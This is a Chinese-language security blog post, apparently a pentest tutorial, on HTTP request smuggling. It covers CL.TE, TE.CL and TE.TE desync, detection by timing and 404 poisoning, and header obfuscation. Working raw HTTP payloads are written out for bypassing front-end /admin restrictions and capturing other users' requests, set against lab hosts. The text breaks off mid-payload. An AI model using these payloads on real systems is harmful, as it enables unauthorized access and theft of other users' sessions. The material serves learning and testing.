<li>最后，NGINX 认为 <code>WebSocket</code> 连接是在客户端和后端之间建立的，实际上没有 <code>WebSocket</code> 连接。同时，反向代理将客户端与后端之间的 TCP 或 TLS 连接保持在开放状态。客户端可以通过连接发送 HTTP 请求轻松访问受限 api。<br><img src="https://github.com/0ang3el/websocket-smuggle/raw/master/img/3-5.png"></li>
</ol>
<p>大多数反向代理都应该受到这种情况的影响。然而，利用需要存在外部SSRF漏洞。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/h2c-smuggling/">https://book.hacktricks.xyz/pentesting-web/h2c-smuggling\</a><br><a target="_blank" rel="noopener" href="https://blog.assetnote.io/2021/03/18/h2c-smuggling//">https://blog.assetnote.io/2021/03/18/h2c-smuggling/\</a><br><a target="_blank" rel="noopener" href="https://bishopfox.com/blog/h2c-smuggling-request/">https://bishopfox.com/blog/h2c-smuggling-request\</a><br><a target="_blank" rel="noopener" href="https://github.com/0ang3el/websocket-smuggle.git">https://github.com/0ang3el/websocket-smuggle.git</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/22/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="sing">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="sing's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/22/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">HTTP请求走私攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-11-22 22:57:50" itemprop="dateCreated datePublished" datetime="2022-11-22T22:57:50+08:00">2022-11-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-12-25 15:49:43" itemprop="dateModified" datetime="2022-12-25T15:49:43+08:00">2022-12-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="什么是-HTTP-请求走私"><a href="#什么是-HTTP-请求走私" class="headerlink" title="什么是 HTTP 请求走私"></a>什么是 HTTP 请求走私</h1><p>当前端(负载均衡&#x2F;反向代理)处理 <code>Content-Length</code> 或者 <code>Transfer-Encoding</code> , 而后端服务器却处理另外一个请求标头, 会导致前后端之间出现同步失效的情况。例如: 发送一个 HTTP 请求，使该请求包同时出现 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> , 前端只处理其中一个, 导致该请求在前端被视作一个整体请求，后端处理另一个, 导致在后端应用被视作两个请求，这就是 HTTP 走私攻击。其中被后端视为第二个请求的请求包，便是走私请求包, 该请求包将会后端认为来自下一个客户端的请求包, 并且来自下一个客户端的真实请求包将会被注入到走私请求包, 成为走私请求包的一部分。</p>
<h2 id="前置认识"><a href="#前置认识" class="headerlink" title="前置认识"></a>前置认识</h2><p><strong>RFC规范(2161)</strong></p>
<blockquote>
<p>如果接收到的请求包同时带有 <code>Transfer-Encoding</code> 和 <code>Content-Length</code> ，必须忽略 <code>Content-Length</code> 。</p>
</blockquote>
<p><strong>HTTP 换行</strong></p>
<blockquote>
<p>HTTP 换行符包含两个字节.</p>
</blockquote>
<p><strong>Content-Length</strong></p>
<blockquote>
<p><code>Content-Length</code> , 声明发送给接收者的数据大小(以字节为单位)。该标头使用十进制数字来声明请求正文的字节数。正文应该以最后一个字符结束，请求末尾不需要新行。</p>
</blockquote>
<p><strong>Transfer-Encoding: chunked</strong></p>
<blockquote>
<p><code>Transfer-Encoding</code> , 声明通信内容的传输方式。 <code>Chunked</code> 表示数据以块的形式发送。该标头在主体中使用一个十六进制数来表示下一个块的字节数。数据块必须以一个新行结束，但这个新行不计入长度指示器。这个传输方法必须以一个大小为0的块结尾，后跟两个新行: <code>0/r/n/r/n</code></p>
</blockquote>
<p><strong>Connection</strong></p>
<blockquote>
<p>建议在请求走私的第一个请求时使用 <code>Connection: keep-alive</code> 。</p>
</blockquote>
<h2 id="HTTP-请求走私攻击的基本形式"><a href="#HTTP-请求走私攻击的基本形式" class="headerlink" title="HTTP 请求走私攻击的基本形式"></a>HTTP 请求走私攻击的基本形式</h2><ul>
<li><strong>CL. TE</strong>: 前端服务器使用 <code>Content-Length</code> ，后端服务器使用 <code>Transfer-Encoding</code>。</li>
<li><strong>TE. CL</strong>: 前端服务器使用 <code>Transfer-Encoding</code>，后端服务器使用 <code>Content-Length</code>。</li>
<li><strong>TE. TE</strong>: 前端和后端服务器都支持 <code>Transfer-Encoding</code> 报头，但是可以通过某种方式混淆标头, 诱导其中一个服务器不作处理。</li>
</ul>
<h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL. TE"></a>CL. TE</h3><p>前端服务器处理 <code>Content-Length</code> ，后端服务器处理 <code>Transfer-Encoding</code> 。执行一个简单的 <code>CL.TE</code> HTTP 请求走私攻击如下:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foo</span>: x</span></span><br></pre></td></tr></table></figure>

<p><code>Content-Length</code> 声明请求数据主体请求长度为 30 字节( HTTP 换行符占两个字节: <code>/r/n</code> )，因此反向代理将把完整的请求发送到后端，由于后端将处理 <code>Transfer-Encoding</code> , <code>GET /404 HTTP/1.1</code> 将被视为下一个请求, 而下一个来自真实用户的请求将被注入到 <code>Foo:x</code> 后, 成为走私请求的一部分。</p>
<h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE. CL"></a>TE. CL</h3><p>前端服务器处理 <code>Transfer-Encoding</code> ，后端服务器处理 <code>Content-Length</code> 。执行一个简单的 <code>TE.CL</code> HTTP 请求走私攻击如下:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">7b</span> </span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: vulnerable-website.com</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">30</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=</span></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>

<p>前端反向代理使用 <code>Transfer-Encoding: chunked</code> , 所以前端将整个请求转发到后端。后端使用 <code>Content-Length</code> , 所以认为存在两个 http 请求, 第一个请求 <code>Content-Length = 4</code> , 所以结束位置是 <code>7b\r\n</code> 。第二个请求则为 <code>GET /404 HTTP/1.1 ....</code> , 由于第二个请求 <code>Content-Length = 30</code> , 但是 <code>x=\r\n</code> 只占 4 个字节, 所以后端会等待请求数据到达, 直至符合 30 字节再进行处理请求 。这意味着下一个真实的用户请求的部分或全部数据将会成为走私请求的一部分。</p>
<blockquote>
<p>注意: <code>Transfer-Encoding: chunked</code> 要求以 <code>0</code> 声明主体数据结束, 所以真实的用户请求数据依然被追加到 <code>x=\r\n0</code> 后面。</p>
</blockquote>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127142906.png" alt="TE. CL"></p>
<h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>前端和后端都支持 <code>Transfer-Encoding</code> ，但是可以通过以某种方式混淆, 以此诱导其中一个服务器不处理它。<br>有无穷无尽的方法来混淆 <code>Transfer-Encoding</code> 头文件。例如:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure>

<p>明确被混淆之后 <code>Transfer-Encoding</code> 在反向代理还是后端服务器会不被处理，或许会得到一个 <code>CL.TE</code> 或 <code>TE.CL</code> 形式的 HTTP 请求走私漏洞。</p>
<h2 id="发现-HTTP-请求走私漏洞"><a href="#发现-HTTP-请求走私漏洞" class="headerlink" title="发现 HTTP 请求走私漏洞"></a>发现 HTTP 请求走私漏洞</h2><h3 id="基于时间的发现技术"><a href="#基于时间的发现技术" class="headerlink" title="基于时间的发现技术"></a>基于时间的发现技术</h3><h4 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h4><p>如果目标系统存在 <code>TE.CL</code> 形式的 HTTP 请求走私漏洞, 可通过以下请求包进行检测:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-tp"><span class="number">0</span></span></span><br><span class="line"><span class="language-tp"></span></span><br><span class="line"><span class="language-tp"><span class="keyword">X</span></span></span><br></pre></td></tr></table></figure>

<p>这是因为前端使用 <code>Transfer-Encoding: chunked</code> , 所以会将上述请求视为两个请求, 从而忽略 <code>X</code> 继而将请求包转发到后端, 而后端使用 <code>Content-Length</code> , 且 <code>Content-Length = 6</code> 。后端通过数值了解到客户端希望发送大小为 6 字节的数据, 由于请求包数据主体大小不满足 6 字节, 所以会继续等待数据的到来, 这将引起明显的时间延迟现象。</p>
<h4 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h4><p>如果目标系统存在 <code>CL.TE</code> 形式的 HTTP 请求走私漏洞, 可通过以下请求包进行检测:</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="number">5</span></span></span><br><span class="line"><span class="language-abnf"><span class="attribute">X</span><span class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127165908.png"></p>
<h3 id="基于-404-响应的技术"><a href="#基于-404-响应的技术" class="headerlink" title="基于 404 响应的技术"></a>基于 <code>404</code> 响应的技术</h3><p>基于时间的技术起了作用之后,我们可以尝试触发 404 响应确认漏洞真实性。并且通过该测试,探究如何影响其他请求,达成攻击利用。最简单的攻击利用就是使客户端的请求结果变为 <code>404</code> 响应。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 通过 CL.TE 修改客户端的响应结果</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>31</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Foox</span>: x</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意,勿需写 <code>Host</code> 头,因为下一个请求会携带 <code>Host</code> 头,如添加可能会报请求头重复错误。</p>
</blockquote>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127200856.png" alt=" 404 投毒"></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20221127200927.png" alt="攻击结果"></p>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h4><p>当试图通过干扰其他请求来确认请求走私漏洞时，应该记住一些重要的注意事项:</p>
<ul>
<li>“攻击”请求和“正常”请求应该通过不同的网络连接发送到服务器,通过同一个连接发送两个请求并不能证明漏洞的存在。</li>
<li>“攻击”请求和“正常”请求应该尽可能使用相同的URL和参数名。这是因为许多现代应用程序根据 URL 和参数将前端请求路由到不同的后端服务器。使用相同的 URL 和参数增加了请求由相同的后端服务器处理的机会。</li>
<li>当测试“正常”请求以检测来自“攻击”请求的任何干扰时，将与其他用户的请求进行竞争。应该在“攻击”请求之后立即发送“正常”请求。如果应用程序繁忙，您可能需要执行多次尝试来确认漏洞。</li>
<li>在某些应用中，前端服务器作为负载均衡器，根据某种负载均衡算法将请求转发到不同的后端系统。如果“攻击”和“正常”请求被转发到不同的后端系统，那么攻击将会失败。这也是您可能需要多次尝试才能确认漏洞的另一个原因。</li>
<li>如果您的攻击成功干扰了后续的请求，但这不是您为检测干扰而发送的“正常”请求，那么这意味着另一个应用程序用户受到了您的攻击的影响。如果您继续执行测试，这可能会对其他用户产生破坏性影响，您应该谨慎操作。</li>
</ul>
<h3 id="使用-hop-by-hop-攻击探测-HTTP-请求走私攻击"><a href="#使用-hop-by-hop-攻击探测-HTTP-请求走私攻击" class="headerlink" title="使用 hop-by-hop 攻击探测 HTTP 请求走私攻击"></a>使用 hop-by-hop 攻击探测 HTTP 请求走私攻击</h3><p>通过 <code>hop-by-hop</code> 攻击 ，可以指示前端代理删除 <code>Content-Length</code> 或<code>Transfer-Encoding</code>，这样可能会导致系统出现 HTTP 请求走私漏洞。</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Content-Lentgh</span><br><span class="line">OR</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Transfer-Encoding</span><br></pre></td></tr></table></figure>

<h2 id="关于-HTTP-请求走私漏洞的攻击利用"><a href="#关于-HTTP-请求走私漏洞的攻击利用" class="headerlink" title="关于 HTTP 请求走私漏洞的攻击利用"></a>关于 HTTP 请求走私漏洞的攻击利用</h2><h3 id="绕过前端安全控制"><a href="#绕过前端安全控制" class="headerlink" title="绕过前端安全控制"></a>绕过前端安全控制</h3><p>有时,前端将执行一些安全检查。通过 HTTP 请求走私漏洞可绕过前端保护。例如,前端限制访问 <code>/admin</code>,通过请求走私绕过前端检查:</p>
<ul>
<li><p><strong>CL.TE</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>acb21fdd1f98c4f180c02944000100b5.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>67</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="language-apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="language-apache"><span class="attribute">Content</span>-Length: <span class="number">10</span></span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"><span class="attribute">x</span>=</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>TE.CL</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace71f491f52696180f41ed100d000d4.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">2b</span></span><br><span class="line"><span class="language-routeros"><span class="built_in">GET</span> /admin HTTP/1.1</span></span><br><span class="line"><span class="language-routeros">Host: localhost</span></span><br><span class="line"><span class="language-routeros"></span></span><br><span class="line"><span class="language-routeros"><span class="attribute">a</span>=x</span></span><br><span class="line"><span class="language-routeros">0</span></span><br><span class="line"><span class="language-routeros"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="获取前端添加内容"><a href="#获取前端添加内容" class="headerlink" title="获取前端添加内容"></a>获取前端添加内容</h3><p>有时候,前端服务器会在转发请求到后端服务器之前执行一些请求重写操作，通常是添加一些请求头。<br>常见为添加 <code>X-Forwarded-For: &lt;客户端 IP&gt;</code> ，以便后端知道客户端的真实 IP 地址。有时，如果能获取前端添加的请求头信息，可能会有助于绕过保护并访问隐藏的接口或资源。<br>为了解前端如何重写请求，可以找到一个 POST 请求,且该请求的参数内容会在响应结果中反映。将该参数放置到最后，发送一个如下形式的请求:</p>
<ul>
<li><strong>CL.TE</strong><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>137</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stata">0</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">POST</span> /<span class="keyword">search</span> HTTP/1.1</span></span><br><span class="line"><span class="language-stata">Host: vulnerable-website.com</span></span><br><span class="line"><span class="language-stata">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span></span><br><span class="line"><span class="language-stata">Content-Length: 100</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">search</span>=</span></span><br></pre></td></tr></table></figure></li>
<li><strong>TE.CL</strong><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-stata">84</span></span><br><span class="line"><span class="language-stata"><span class="keyword">POST</span> /<span class="keyword">search</span> HTTP/1.1</span></span><br><span class="line"><span class="language-stata">Host: vulnerable-website.com</span></span><br><span class="line"><span class="language-stata">Content-<span class="keyword">Type</span>: application/x-www-<span class="keyword">form</span>-urlencoded</span></span><br><span class="line"><span class="language-stata">Content-Length: 100</span></span><br><span class="line"><span class="language-stata"></span></span><br><span class="line"><span class="language-stata"><span class="keyword">search</span>=</span></span><br><span class="line"><span class="language-stata">0</span></span><br><span class="line"><span class="language-stata"></span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>测试过程中需注意走私请求的 <code>Content-Length</code> 数值,过小则不能完全获取请求信息,过大则会抛出错误。</p>
<h3 id="捕获用户请求"><a href="#捕获用户请求" class="headerlink" title="捕获用户请求"></a>捕获用户请求</h3><p>假设目标存在请求走私漏洞,且存在一个 POST 请求接口，该接口保存其中一个参数的内容。发送以下请求将可存储下一个客户端的请求:</p>
<ul>
<li><p><strong>CL.TE</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>314</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="language-dts"><span class="number">0</span></span></span><br><span class="line"><span class="language-dts">POST <span class="keyword">/post/</span>comment HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-dts"><span class="symbol">Host:</span> ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span></span><br><span class="line"><span class="language-dts">Content-Length: <span class="number">659</span></span></span><br><span class="line"><span class="language-dts">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="language-dts"><span class="symbol">Cookie:</span> <span class="attr">session</span><span class="operator">=</span><span class="number">4</span>X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span></span><br><span class="line"><span class="language-dts"></span></span><br><span class="line"><span class="language-dts"><span class="attr">csrf</span><span class="operator">=</span>gpGAVAbj7pKq7VfFh45CAICeFCnancCM<span class="variable">&amp;</span>postId=<span class="number">4</span><span class="variable">&amp;name</span>=HACKTRICKS<span class="variable">&amp;email</span>=email%<span class="number">40</span>email.com<span class="variable">&amp;comment</span>=</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>TE.CL</strong></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi</span><br><span class="line"><span 